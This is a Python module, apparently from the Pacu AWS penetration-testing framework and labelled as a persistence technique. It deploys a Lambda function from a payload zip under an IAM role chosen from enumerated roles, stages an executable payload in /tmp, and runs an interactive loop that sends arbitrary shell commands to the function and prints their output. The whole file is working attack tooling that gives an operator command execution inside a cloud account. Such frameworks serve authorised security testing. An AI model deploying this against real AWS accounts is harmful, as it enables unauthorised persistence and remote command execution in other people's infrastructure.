#!/usr/bin/env python3
import argparse
from botocore.exceptions import ClientError
import os
import boto3, botocore
import datetime
import json
from pathlib import Path

module_info = {
    'name': 'lambda_executor',
    'author': 'Alexander Morgenstern',
    'category': 'persistence',
    'one_liner': 'Creates a Lambda function in a VPC to send commands through',
    'description': 'This module should be able to create a lambda function in a VPC to send commands and return output.',
    'services': ['Lambda'],
    'prerequisite_modules': [],
    'external_dependencies': [],
    'arguments_to_autocomplete': ['--vpc', '--code'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
parser.add_argument('--vpc', help='VPC to target when staging the Lambda function')
parser.add_argument(
    '--code', 
    default='modules/lambda_executor/payload.zip',
    help='Zip file that contains the source code of the Lambda function')

FUNC_NAME = 'function_executor'

def get_code(zip_file):
    path = Path(zip_file)
    if not path.exists():
        return ''
    with open(r'{}'.format(zip_file), 'rb') as code_file:
        out = code_file.read()
    return out

def get_role(pacu):
    if pacu.fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles') is False:
        return ''
    session = pacu.get_active_session()
    roles = session.IAM['Roles']
    pacu.print('  Select Lambda Execution Role: ')
    for role in roles:
        if pacu.input('    {} (y/n)? '.format(role['RoleName'])) == 'y':
            return role['Arn']
    return ''

def get_handler():
    return 'lambda_func.lambda_handler'

def init_function(client, role, handler, code):
    try:
        client.create_function(
            FunctionName=FUNC_NAME,
            Runtime='python3.6',
            Role=role,
            Handler=handler,
            Code={'ZipFile':code},
            Timeout=300,
        )
        return True
    except ClientError:
        return False

def cleanup(client):
    client.delete_function(FunctionName=FUNC_NAME)
    return

def send_command(client, command):
    try:
        return client.invoke(
            FunctionName=FUNC_NAME,
            Payload=json.JSONEncoder().encode({"command":command})
        )
    except ClientError as error:
        return error.response['Error']['Code']


def main(args, pacu):
    args = parser.parse_args(args)
    pacu.print('Starting module')

    client = pacu.get_boto3_client('lambda', 'ap-northeast-2')
    if not init_function(
        client, get_role(pacu), get_handler(), get_code(args.code)):
        return {'fail': 'Unable to create Lambda function'}

    pacu.print('  Function Creation Successful')
    pacu.print('  Initialzing Payload to /tmp...')
    send_command(client, 'cp -r exec /tmp')
    send_command(client, 'chmod -R a+x /tmp')

    while True:
        command = pacu.input('  Enter Command: ')
        if command == 'exit':
            break
        response = send_command(client, command)
        decoded = response['Payload'].read().decode()
        decoded_json = json.JSONDecoder().decode(decoded)
        if 'body' in decoded_json:
            pacu.print('OUTPUT RETURNED:\n{}'.format(decoded_json['body']))
        else:
            pacu.print('  Unexpected response format')
    
    cleanup(client)
    return {'success': 'Lambda Function Execution Successful'}

def summary(data, pacu_main):
    if 'fail' in data:
        out = data['fail']
    elif 'success' in data:
        out = data['success']
    return '  ' + out
